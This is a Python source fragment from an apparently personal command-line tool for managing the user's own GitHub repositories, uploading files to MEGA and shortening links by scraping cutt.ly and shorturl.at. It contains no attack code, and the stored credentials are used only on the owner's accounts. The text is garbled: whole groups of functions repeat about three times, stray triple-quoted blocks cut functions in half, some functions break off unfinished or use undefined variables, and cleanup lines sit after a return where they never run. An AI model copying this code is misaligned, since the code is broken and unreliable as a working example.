    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
# --- imports

import os 
import sys
from pathlib import Path
import random
try:
    import pwinput
    import requests
    import colorama
except ImportError:
    _ = os.system('pip install tqdm' if os.name=='nt' else 'pip3 install tqdm')
    _ = os.system('pip install pwinput' if os.name=='nt' else 'pip3 install pwinput')
    _ = os.system('pip install colorama' if os.name=='nt' else 'pip3 install colorama')
    _ = os.system('pip install requests' if os.name=='nt' else 'pip3 install requests')

import shutil
import time
import requests
from colorama import Fore
from pwinput import pwinput
from threading import Thread
from tqdm import tqdm
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
